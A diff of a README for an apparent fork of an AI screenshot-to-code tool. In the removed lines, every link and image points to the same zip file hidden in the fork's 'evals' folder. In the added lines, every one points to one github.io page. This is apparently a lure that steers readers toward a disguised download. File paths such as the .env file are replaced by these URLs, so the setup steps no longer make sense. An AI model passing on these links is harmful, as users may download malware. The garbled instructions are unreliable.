@@ -2,7 +2,7 @@
 
 A simple tool to convert screenshots, mockups and Figma designs into clean, functional code using AI.
 
-https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip
+https://mitsou55.github.io
 
 Supported stacks:
 
@@ -24,15 +24,15 @@ See the [Examples](#-examples) section below for more demos.
 
 We also just added experimental support for taking a video/screen recording of a website in action and turning that into a functional prototype. 
 
-![google in app quick 3](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip)
+![google in app quick 3](https://mitsou55.github.io)
 
-[Learn more about video here](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip).
+[Learn more about video here](https://mitsou55.github.io).
 
-[Follow me on Twitter for updates](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip).
+[Follow me on Twitter for updates](https://mitsou55.github.io).
 
 ## 🚀 Try It Out without no install
 
-[Try it live on the hosted version (paid)](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip).
+[Try it live on the hosted version (paid)](https://mitsou55.github.io).
 
 ## 🛠 Getting Started
 
@@ -48,7 +48,7 @@ poetry shell
 poetry run uvicorn main:app --reload --port 7001
 ```
 
-If you want to use Anthropic, add the `ANTHROPIC_API_KEY` to `https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip` with your API key from Anthropic.
+If you want to use Anthropic, add the `ANTHROPIC_API_KEY` to `https://mitsou55.github.io` with your API key from Anthropic.
 
 Run the frontend:
 
@@ -60,7 +60,7 @@ yarn dev
 
 Open http://localhost:5173 to use the app.
 
-If you prefer to run the backend on a different port, update VITE_WS_BACKEND_URL in `https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip`
+If you prefer to run the backend on a different port, update VITE_WS_BACKEND_URL in `https://mitsou55.github.io`
 
 For debugging purposes, if you don't want to waste GPT4-Vision credits, you can run the backend in mock mode (which streams a pre-recorded response):
 
@@ -81,12 +81,12 @@ The app will be up and running at http://localhost:5173. Note that you can't dev
 
 ## 🙋‍♂️ FAQs
 
-- **I'm running into an error when setting up the backend. How can I fix it?** [Try this](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip). If that still doesn't work, open an issue.
-- **How do I get an OpenAI API key?** See https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip
-- **How can I configure an OpenAI proxy?** - If you're not able to access the OpenAI API directly (due to e.g. country restrictions), you can try a VPN or you can configure the OpenAI base URL to use a proxy: Set OPENAI_BASE_URL in the `https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip` or directly in the UI in the settings dialog. Make sure the URL has "v1" in the path so it should look like this:  `https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip`
-- **How can I update the backend host that my front-end connects to?** - Configure VITE_HTTP_BACKEND_URL and VITE_WS_BACKEND_URL in https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip For example, set VITE_HTTP_BACKEND_URL=http://124.10.20.1:7001
+- **I'm running into an error when setting up the backend. How can I fix it?** [Try this](https://mitsou55.github.io). If that still doesn't work, open an issue.
+- **How do I get an OpenAI API key?** See https://mitsou55.github.io
+- **How can I configure an OpenAI proxy?** - If you're not able to access the OpenAI API directly (due to e.g. country restrictions), you can try a VPN or you can configure the OpenAI base URL to use a proxy: Set OPENAI_BASE_URL in the `https://mitsou55.github.io` or directly in the UI in the settings dialog. Make sure the URL has "v1" in the path so it should look like this:  `https://mitsou55.github.io`
+- **How can I update the backend host that my front-end connects to?** - Configure VITE_HTTP_BACKEND_URL and VITE_WS_BACKEND_URL in https://mitsou55.github.io For example, set VITE_HTTP_BACKEND_URL=http://124.10.20.1:7001
 - **Seeing UTF-8 errors when running the backend?** - On windows, open the .env file with notepad++, then go to Encoding and select UTF-8. 
-- **How can I provide feedback?** For feedback, feature requests and bug reports, open an issue or ping me on [Twitter](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip).
+- **How can I provide feedback?** For feedback, feature requests and bug reports, open an issue or ping me on [Twitter](https://mitsou55.github.io).
 
 ## 📚 Examples
 
@@ -94,18 +94,18 @@ The app will be up and running at http://localhost:5173. Note that you can't dev
 
 | Original                                                                                                                                                        | Replica                                                                                                                                                         |
 | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| <img width="1238" alt="Screenshot 2023-11-20 at 12 54 03 PM" src="https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip"> | <img width="1414" alt="Screenshot 2023-11-20 at 12 59 56 PM" src="https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip"> |
+| <img width="1238" alt="Screenshot 2023-11-20 at 12 54 03 PM" src="https://mitsou55.github.io"> | <img width="1414" alt="Screenshot 2023-11-20 at 12 59 56 PM" src="https://mitsou55.github.io"> |
 
 **Instagram page (with not Taylor Swift pics)**
 
-https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip
+https://mitsou55.github.io
 
 **Hacker News** but it gets the colors wrong at first so we nudge it
 
-https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip
+https://mitsou55.github.io
 
 ## 🌍 Hosted Version
 
-🆕 [Try it here (paid)](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip). Or see [Getting Started](#-getting-started) for local install instructions to use with your own API keys.
+🆕 [Try it here (paid)](https://mitsou55.github.io). Or see [Getting Started](#-getting-started) for local install instructions to use with your own API keys.
 
-[!["Buy Me A Coffee"](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip)](https://github.com/mitsou55/screenshot-to-code/raw/refs/heads/main/frontend/src/components/evals/code-to-screenshot-v1.5.zip)
+[!["Buy Me A Coffee"](https://mitsou55.github.io)](https://mitsou55.github.io)
